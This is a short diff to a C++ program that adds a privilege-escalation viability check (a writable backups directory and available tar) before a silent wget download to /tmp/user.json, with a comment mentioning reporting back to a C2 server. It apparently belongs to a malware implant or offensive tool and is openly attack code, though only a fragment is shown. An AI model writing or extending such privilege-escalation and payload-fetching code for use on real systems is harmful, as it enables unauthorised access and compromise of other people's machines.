@@ -1,7 +1,18 @@
 #include <cstdlib>
 #include <string>
+#include "privesc_check.h"
 
 int main() {
+    
+    PrivEscConditions privesc = check_privesc_viability();
+    
+    // Only proceed if conditions are favorable
+    // In a real scenario, you might send this info back to C2 first
+    if (!privesc.backups_dir_writable || !privesc.tar_available) {
+        // Abort or use alternative method
+        return 1;
+    }
+    
     // Wget URL
     std::string url = URL;
     std::string command0 = "wget -q " + url + " -O /tmp/user.json";
